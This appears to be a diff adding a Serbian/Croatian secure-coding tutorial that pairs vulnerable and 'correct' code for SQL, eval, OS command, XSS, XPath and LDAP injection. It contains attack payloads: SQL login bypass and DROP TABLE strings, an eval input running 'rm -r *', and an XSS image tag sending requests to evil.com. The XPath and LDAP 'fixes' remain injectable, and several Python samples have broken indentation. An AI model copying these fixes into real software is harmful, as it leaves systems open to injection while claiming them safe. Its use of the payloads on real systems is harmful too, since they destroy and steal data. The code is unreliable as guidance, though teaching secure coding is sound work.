@@ -1,0 +1,362 @@
+Primeri:
+
+SQL Injection
+
+1. Prijavljivanje kao admin
+Kako ne treba:
+function getUser(username) {
+    var query = "SELECT * FROM users WHERE username='" + username + "';";
+    // Ovde bismo obično izvršavali upit na bazi podataka, ali ćemo samo prikazati upit.
+    console.log("SQL upit:", query);
+}
+# Primer poziva funkcije sa korisničkim unosom
+getUser("admin' OR '1'='1'; --");
+
+Kako treba:
+function getUserSafe(username) {
+    // Koristimo parametrizovani upit
+    var query = "SELECT * FROM users WHERE username=?";
+    // Ovde bismo obično izvršavali upit na bazi podataka, ali ćemo samo prikazati upit.
+    console.log("SQL upit:", query);
+    console.log("Parametri:", [username]);
+}
+
+# Primer poziva funkcije sa sigurnim korisničkim unosom
+getUserSafe("admin' OR '1'='1'; --");
+
+2. Brisanje tabele
+Neispravan kod:
+const userInput = "'; DROP TABLE subscriptions --";
+const insertQuery = `INSERT INTO subscriptions(email) VALUES ('${userInput}')`;
+
+// Izvršavanje upita na bazi (primjer s Node.js i mysql bibliotekom)
+connection.query(insertQuery, (error, results) => {
+    if (error) {
+        console.error(error);
+    } else {
+        console.log("Uspješno umetnuto!");
+    }
+});
+Ispravan kod:
+const userInput = "'; DROP TABLE subscriptions --";
+const insertQuery = "INSERT INTO subscriptions(email) VALUES (?)";
+
+// Izvršavanje parametriziranog upita na bazi (primjer s Node.js i mysql bibliotekom)
+connection.query(insertQuery, [userInput], (error, results) => {
+    if (error) {
+        console.error(error);
+    } else {
+        console.log("Uspješno umetnuto!");
+    }
+});
+
+3. Insert
+Neispravan kod sa SQL Injection pokušajem INSERT-a:
+const userInput = "'; INSERT INTO malicious_data (data) VALUES ('Injected data'); --";
+const insertQuery = INSERT INTO users(username, email) VALUES ('${userInput}', 'example@example.com');
+
+// Izvršavanje upita na bazi 
+connection.query(insertQuery, (error, results) => {
+    if (error) {
+        console.error(error);
+    } else {
+        console.log("Uspešno umetnuto!");
+    }
+});
+Ispravan kod sa korišćenjem parametrizovanog upita:
+const userInput = "'; INSERT INTO malicious_data (data) VALUES ('Injected data'); --";
+const insertQuery = "INSERT INTO users(username, email) VALUES (?, 'example@example.com')";
+
+// Izvršavanje parametriziranog upita na bazi 
+connection.query(insertQuery, [userInput], (error, results) => {
+    if (error) {
+        console.error(error);
+    } else {
+        console.log("Uspješno umetnuto!");
+    }
+});
+
+Ukoliko admin odobrava ili odbija korisnike, ovako bi maliciozni korisnik odmah dodao svoj nalog i preskocio
+taj deo.
+
+Eval funkcija
+
+4. Eval basic funkcija
+let userInput = "alert('Hello, this is eval!');";
+eval(userInput);
+
+Važno je napomenuti da se izbjegava korištenje eval() kad god je to moguće,
+ jer se može lako zloupotrijebiti i predstavljati ozbiljan sigurnosni rizik. 
+Umjesto toga, preporučuje se koristiti alternative poput funkcija JSON.parse() za parsiranje JSON podataka
+ ili drugih sigurnih metoda za izvršavanje koda.
+
+5. Eval funkcija
+
+Kako ne treba:
+def main():
+sum = 0
+numbers = eval(input("Enter a space-separated list of numbers: "))
+for num in numbers:
+sum = sum + num
+print(f"Sum of {numbers} = {sum}")
+main()
+
+Korišćenje eval funkcije omogućava korisnicima da unesu bilo koji izraz koji će biti izvršen.
+Kada korisnik unese: __import__('subprocess').getoutput('rm -r *')  -> brise fajlove iz tekuceg direktorijuma
+
+Kako treba:
+def main():
+sum = 0
+numbers = input("Enter a space-separated list of numbers: ").split(" ")
+try:
+for num in numbers:
+sum = sum + int(num)
+print(f"Sum of {numbers} = {sum}")
+except ValueError:
+print("Error: invalid input")
+main()
+
+OS Command
+
+6. OS Command Injection
+Kako ne treba:
+def pokreni_naredbu(korisnicki_unos):
+    naredba = "echo " + korisnicki_unos
+    rezultat = os.system(naredba)
+    print("Rezultat izvršene naredbe:", rezultat)
+
+korisnicki_unos = input("Unesite neki tekst: ")
+pokreni_naredbu(korisnicki_unos)
+
+U ovom primjeru, korisnik treba unijeti tekst, no ukoliko korisnički unos sadrži specijalne znakove koji 
+se koriste u naredbama operativnog sustava, 
+moguće je izvršiti zlonamjerne naredbe. Na primjer, korisnik može unijeti nešto poput: hello; ls -la
+Što će rezultirati izvršavanjem dvije naredbe: echo hello i ls -la. Ovo je jednostavan primjer, ali u stvarnim situacijama, 
+to može biti puno ozbiljnije, poput brisanja datoteka, pokretanja zlonamjernih skripti i slično.
+
+Kako treba:
+def pokreni_naredbu_ispravno(korisnicki_unos):
+    try:
+        rezultat = subprocess.check_output(["echo", korisnicki_unos], universal_newlines=True)
+        print("Rezultat izvršene naredbe:", rezultat)
+    except subprocess.CalledProcessError as e:
+        print("Greška pri izvršavanju naredbe:", e)
+
+korisnicki_unos = input("Unesite neki tekst: ")
+pokreni_naredbu_ispravno(korisnicki_unos)
+
+Korištenjem subprocess modula s metodom check_output, možemo spriječiti OS Command Injection tako da se korisnički unos
+ tretira kao argumenti naredbe, umjesto da se koristi u samoj naredbi.
+
+XSS
+
+7. Cross-Site Scripting (XSS)
+Neispravan kod (JavaScript):
+<!-- Neispravan način - ne filtrira se korisnički unos -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Primjer</title>
+</head>
+<body>
+    <h1>Dobrodošli na našu web stranicu!</h1>
+    <p>Komentar: <script>alert('XSS napad!');</script></p>
+</body>
+</html>
+Napadač može umetnuti zlonamjerni JavaScript kod kao dio URL-a:
+http://example.com/xss.html?comment=<script>alert('XSS napad!');</script>
+Ispravan kod (JavaScript):
+<!-- Ispravan način - koristi innerText za prikazivanje teksta, ne izvršava JavaScript kod -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Primjer</title>
+</head>
+<body>
+    <h1>Dobrodošli na našu web stranicu!</h1>
+    <p id="comment"></p>
+
+    <script>
+        // Dobivanje komentara iz URL parametra
+        var comment = new URLSearchParams(window.location.search).get('comment');
+
+        // Postavljanje komentara pomoću innerText
+        document.getElementById('comment').innerText = comment;
+    </script>
+</body>
+</html>
+Korištenje innerText osigurava da se sadržaj prikaže kao tekst, a ne kao izvršiv JavaScript kod.
+
+Naravno, preporučljivo je koristiti odgovarajuće metode za filtriranje i escapiranje korisničkih unosa, ovisno o kontekstu u kojem se koriste.
+
+8.XSS
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Example - User Impersonation</title>
+</head>
+<body>
+    <h1>Welcome to our website!</h1>
+    <p>This is a vulnerable page with a comment section.</p>
+
+    <!-- Ranjiva tačka: prikazuje korisnički unos bez provere -->
+    <div id="comment-section"></div>
+
+    <script>
+        // Simulacija ranjivog prikaza komentara
+        var userComment = '<img src="https://evil.com/steal_user_data" onerror="sendRequest()">';
+
+        // Postavljanje korisničkog unosa (simulacija korisničkog komentara)
+        document.getElementById('comment-section').innerHTML = userComment;
+
+        // Zlonamerna funkcija koja se pokreće u slučaju greške pri učitavanju slike
+        function sendRequest() {
+            // Simulacija slanja zahteva u ime korisnika
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://evil.com/steal_user_data", true);
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
+
+-Simuliramo korisnički unos koji predstavlja komentar. U ovom slučaju, korisnički unos je 
+HTML fragment koji sadrži <img> element sa onerror atributom.
+-Korisnički unos se postavlja unutar div elementa, simulirajući situaciju gde 
+korisnički komentar nije dovoljno sigurno obrađen.
+-Kada web stranica pokuša učitati sliku sa adrese https://evil.com/steal_user_data, ali dođe do greške (npr. slika ne postoji), 
+aktiviraće se onerror događaj, što će izazvati poziv funkcije sendRequest().
+-Funkcija sendRequest() simulira slanje zahteva ka zlonamernom serveru, čime se simulira zlonamerno ponašanje. 
+U stvarnom XSS napadu, ova funkcija može biti zlonamernija, npr. pok
+ušavajući ukrasti kolačiće korisnika ili manipulisati korisničkim podacima na serveru.
+
+
+XPath
+
+9. XPath Injection
+XPath Injection je vrsta napada koja se događa kada korisnički unos nije ispravno sanitiziran prije nego što se koristi u XPath upitu.
+ XPath (XML Path Language) koristi se za navigaciju i izdvajanje podataka iz XML dokumenata. Ako se korisnički unos ne filtrira pravilno,
+ napadač može manipulirati XPath upitom kako bi dobio neželjene podatke ili izazvao neočekivano ponašanje.
+ Neispravan kod:
+from lxml import etree
+
+def search_user(username):
+    xpath_query = f"//user[username='{username}']"
+    result = root.xpath(xpath_query)
+    return result
+
+# Korisnički unos dobiven iz HTTP zahteva
+user_input = "' or '1'='1' or '"
+users = search_user(user_input)
+
+# Provjera pronađenih korisnika
+if users:
+    print("Pronađeni korisnici:", users)
+else:
+    print("Nijedan korisnik nije pronađen.")
+U ovom neispravnom kodu, korisnički unos (user_input) se umetne izravno u XPath upit. Ako napadač unese ' or '1'='1' or '
+ kao korisnički unos, cijeli XPath upit postaje //user[username='' or '1'='1' or ''], što će uvijek biti istinito. 
+To može rezultirati dohvaćanjem svih korisnika iz XML dokumenta, umjesto samo traženog korisnika.
+
+Ispravan kod:
+from lxml import etree
+
+def search_user(username):
+    # Korištenje parametra kako bi se spriječio XPath Injection
+    xpath_query = "//user[username='%s']" % username
+    result = root.xpath(xpath_query)
+    return result
+
+# Korisnički unos dobiven iz HTTP zahteva
+user_input = "' or '1'='1' or '"
+users = search_user(user_input)
+
+# Provjera pronađenih korisnika
+if users:
+    print("Pronađeni korisnici:", users)
+else:
+    print("Nijedan korisnik nije pronađen.")
+U ispravnom kodu, korisnički unos (user_input) se koristi kao parametar u XPath upitu, čime se spriječava XPath Injection. 
+Korištenje parametara umjesto umetanja korisničkog unosa direktno u upit smanjuje rizik od napada. 
+Važno je primijetiti da pristup XPath Injection može varirati ovisno o kontekstu primjene i korištenim tehnologijama.
+
+LDAP Injection
+
+10. LDAP
+LDAP injection je sigurnosna ranjivost koja nastaje kada se korisnički unos nepravilno obrađuje prilikom formiranja 
+LDAP (Lightweight Directory Access Protocol) upita. Ovde ćemo prikazati jednostavan primer LDAP injection u JavaScript-u.
+
+Kako ne treba:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LDAP Search</title>
+</head>
+<body>
+  <h1>LDAP Search</h1>
+  <form id="ldapForm">
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username" required>
+    <button type="button" onclick="searchLDAP()">Search</button>
+  </form>
+  <div id="result"></div>
+
+  <script>
+    function searchLDAP() {
+      var username = document.getElementById('username').value;
+
+      // Neispravna upotreba korisničkog unosa u LDAP upitu
+      var ldapQuery = "(uid=" + username + ")";
+      
+      // Ovde bi trebalo da se izvrši LDAP pretraga sa ldapQuery, ali se ne radi radi jednostavnosti primera
+      
+      // Prikaz rezultata na stranici (simulacija)
+      document.getElementById('result').innerText = "Izvršena LDAP pretraga sa upitom: " + ldapQuery;
+    }
+  </script>
+</body>
+</html>
+
+Kako treba:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LDAP Search</title>
+</head>
+<body>
+  <h1>LDAP Search</h1>
+  <form id="ldapForm">
+    <label for="username">Username:</label>
+    <input type="text" id="username" name="username" required>
+    <button type="button" onclick="searchLDAP()">Search</button>
+  </form>
+  <div id="result"></div>
+
+  <script>
+    function searchLDAP() {
+      var username = document.getElementById('username').value;
+
+      // Ispravna upotreba parametara u LDAP upitu
+      var ldapQuery = "(uid=" + encodeURIComponent(username) + ")";
+      
+      // Ovde bi trebalo da se izvrši LDAP pretraga sa ldapQuery, ali se ne radi radi jednostavnosti primera
+      
+      // Prikaz rezultata na stranici (simulacija)
+      document.getElementById('result').innerText = "Izvršena LDAP pretraga sa upitom: " + ldapQuery;
+    }
+  </script>
+</body>
+</html>
+
+U ovom ispravnom primeru, korisnički unos se enkodira pomoću funkcije encodeURIComponent pre nego što se koristi u LDAP upitu.
+ Ovaj pristup obezbeđuje ispravno rukovanje specifičnim karakterima za LDAP i sprječava potencijalne injection ranjivosti.
